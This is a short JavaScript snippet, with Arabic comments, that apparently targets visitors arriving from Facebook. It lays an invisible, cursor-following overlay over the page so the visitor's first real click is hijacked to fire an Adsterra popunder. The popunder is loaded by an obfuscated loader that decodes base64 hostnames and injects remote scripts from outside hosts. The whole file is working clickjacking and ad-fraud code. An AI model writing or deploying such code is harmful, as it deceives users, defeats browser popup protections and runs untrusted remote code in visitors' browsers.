(function() {
    const params = new URLSearchParams(window.location.search);
    if (!params.has("fb_source")) return;

    // 1. إنشاء الزر "الشبح"
    const ghostButton = document.createElement('div');
    ghostButton.style.cssText = `
        position: fixed; width: 80px; height: 80px;
        background: transparent; z-index: 2147483647;
        cursor: pointer; pointer-events: auto;
    `;
    document.body.appendChild(ghostButton);

    // 2. جعل الزر يتبع الإصبع أو الماوس بدقة
    window.addEventListener('mousemove', (e) => {
        ghostButton.style.left = (e.clientX - 40) + 'px';
        ghostButton.style.top = (e.clientY - 40) + 'px';
    });

    window.addEventListener('touchmove', (e) => {
        const touch = e.touches[0];
        ghostButton.style.left = (touch.clientX - 40) + 'px';
        ghostButton.style.top = (touch.clientY - 40) + 'px';
    }, { passive: true });

    // 3. لحظة الانفجار (التنفيذ عند أول نقرة حقيقية)
    ghostButton.addEventListener('click', function() {
        // تفعيل كود البوب الرسمي (المتصفح سيفتحه فوراً لأن النقرة فوق الزر حقيقية)
        launchAdsterra();

        // تدمير الزر الشبح فوراً لكي يتمكن الزائر من تصفح الموقع طبيعياً
        ghostButton.remove();
        console.log("Success: Real Human Click Captured");
    });

    function launchAdsterra() {
        // كود البوب الرسمي (Adsterra)
        (function(){var x=window,m="e23f9a20a32bcb0e16cc092ebc328951",z=[["siteId",260-829*134*841-342+97961243],["minBid",0],["popundersPerIP","0"],["delayBetween",0],["default",false],["defaultPerDay",0],["topmostLayer","auto"]],s=["d3d3LmludGVsbGlwb3B1cC5jb20vVGxjL3hmbG93dHlwZS5taW4uanM=","ZDNtcjd5MTU0ZDJxZzUuY2xvdWRmcm9udC5uZXQvTnZGL1BNL2diYXRtYW4ubWluLmNzcw=="],c=-1,o,w,d=function(){clearTimeout(w);c++;if(s[c]&&!(1801238139000<(new Date).getTime()&&1<c)){o=x.document.createElement("script");o.type="text/javascript";o.async=!0;var r=x.document.getElementsByTagName("script")[0];o.src="https://"+atob(s[c]);o.crossOrigin="anonymous";o.onerror=d;o.onload=function(){clearTimeout(w);};w=setTimeout(d,5E3);r.parentNode.insertBefore(o,r)}};if(!x[m]){try{Object.freeze(x[m]=z)}catch(e){}d()}})();
    }
})();
